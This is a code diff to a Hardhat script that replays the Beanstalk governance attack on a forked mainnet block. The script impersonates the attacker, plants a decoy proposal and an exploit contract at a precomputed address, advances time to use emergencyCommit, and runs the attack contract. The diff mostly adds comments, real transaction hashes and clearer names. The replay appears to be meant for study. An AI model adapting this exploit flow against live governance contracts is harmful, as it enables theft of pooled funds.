@@ -10,6 +10,7 @@ const BEANSTALK = "0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5"; // proxy -> 0xf4
 const FACTORY = "0x4e59b44847b379578588920cA78FbF26c0B4956C"; // Foundry Create2Deployer
 
 async function main() {
+    // Fork the block before the attacker deployed fake BIP proposal (19)
 	await reset(RPC_URL, 14595636);
 
 	const hacker = await ethers.getImpersonatedSigner(HACKER);
@@ -20,8 +21,8 @@ async function main() {
 		hacker
 	);
 
-	// ? Hacker had 0xE5eCF73603D98A0128F05ed30506ac7A663dBb69 contract address
-	// ? Here we use our own written exploit contract, so the address is not matched
+	// ? Hacker had 0xE5eCF73603D98A0128F05ed30506ac7A663dBb69 precomputed contract address
+	// ? Here I use my own written exploit contract, so the address is not matched (different bytecode)
 	const precomputedExploitInitBip18Address = ethers.getCreate2Address(
 		FACTORY,
 		ethers.encodeBytes32String(""), // salt: 0
@@ -33,16 +34,22 @@ async function main() {
 		precomputedExploitInitBip18Address
 	);
 
-	const initBip18 = await ethers.deployContract("InitBip18", [], {
-		signer: hacker,
-	});
+    // Real tx: 0xd09b72275962b03dd96205f8077fdc08bec87c0ebd07e431aadc760f31f34b01
+	const initBip19 = await ethers.deployContract(
+        "InitBip18", 
+        [], 
+        {
+		    signer: hacker,
+	    }
+    );
 
-	const tx = await initBip18.waitForDeployment();
-	const fakeBip18Address = tx.target;
+	const tx = await initBip19.waitForDeployment();
+	const bip19Address = tx.target;
 
-	console.log("InitBip18 deployed to:", fakeBip18Address);
+	console.log("BIP-19 deployed to:", bip19Address);
 
 	// attack proposal (bip-18)
+    // Real tx: 0x68cdec0ac76454c3b0f7af0b8a3895db00adf6daaf3b50a99716858c4fa54c6f
 	await governance.connect(hacker).propose(
 		[],
 		// 0xE5eCF73603D98A0128F05ed30506ac7A663dBb69
@@ -53,16 +60,18 @@ async function main() {
 	);
 
 	// fake proposal (bip-19)
+    // Real tx: 0x9575e478d7c542558ecca52b27072fa1f1ec70679106bdbd62f3bb4d6c87a80d
 	await governance.connect(hacker).propose(
 		[],
 		// 0x259a2795624B8a17bC7EB312a94504Ad0F615D1E
-		fakeBip18Address,
+		bip19Address,
 		// init()
 		"0xe1c7392a",
 		3
 	);
 
 	// transfer to bip-18 address some ETH to make it look like a real EOA address
+    // Real tx: 0x3cb358d40647e178ee5be25c2e16726b90ff2c17d34b64e013d8cf1c2c358967
 	await hacker.sendTransaction({
 		to: precomputedExploitInitBip18Address,
 		value: ethers.parseEther("0.25"),
@@ -73,6 +82,7 @@ async function main() {
 	).to.equal("0x");
 
 	// deploy the exploit bip-18 to the precomputed address using foundry factory
+    // 0x677660ce489935b94bf5ac32c494669a71ee76913ffabe623e82a7de8226b460
 	await hacker.sendTransaction({
 		to: FACTORY,
 		data: ethers.concat([ethers.encodeBytes32String(""), bip18Bytecode]),
@@ -84,15 +94,16 @@ async function main() {
 
 	// === Attack ===
 
-	// wait for 24 hours
+	// wait for 24 hours to be able to execute the proposal via emergencyCommit()
 	await time.increase(60 * 60 * 24 + 1);
 
 	console.log(
-		"Balance before hack:",
+		"Attacker balance before hack:",
 		ethers.formatEther(await ethers.provider.getBalance(HACKER)) + " ETH"
 	);
 
 	// Attack
+    // Real tx: 0xcd314668aaa9bbfebaf1a0bd2b6553d01dd58899c508d4729fa7311dc5d33ad7
 	const attack = await ethers.deployContract("BeanstalkAttack", [], {
 		signer: hacker,
 	});
@@ -100,7 +111,7 @@ async function main() {
 	await attack.waitForDeployment();
 
 	console.log(
-		"Balance after hack:",
+		"Attacker balance after hack:",
 		ethers.formatEther(await ethers.provider.getBalance(HACKER)) + " ETH"
 	);
 }
